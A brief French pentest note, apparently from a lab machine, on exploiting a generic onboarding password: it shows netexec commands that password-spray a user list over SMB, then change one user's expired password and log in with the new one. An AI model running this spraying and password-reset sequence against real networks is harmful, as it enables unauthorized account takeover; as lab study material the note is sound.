Lors d'une intégration d'un colalborateur, il est possible de devoir changer un mot de passe générique

Trouver un compte ou l'peut changer le mdp actuel
```bash 
netexec smb 10.129.234.71 -u users.txt -p 'BabyStart123!'
```

```bash 
netexec smb 10.129.234.71 -u Caroline.Robinson -p 'BabyStart123!'
```

Changer le password le Caroline Robinson
```bash 
netexec smb 10.129.234.71 -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS='Password123!'
netexec smb 10.129.234.71 -u Caroline.Robinson -p 'Password123!'
```
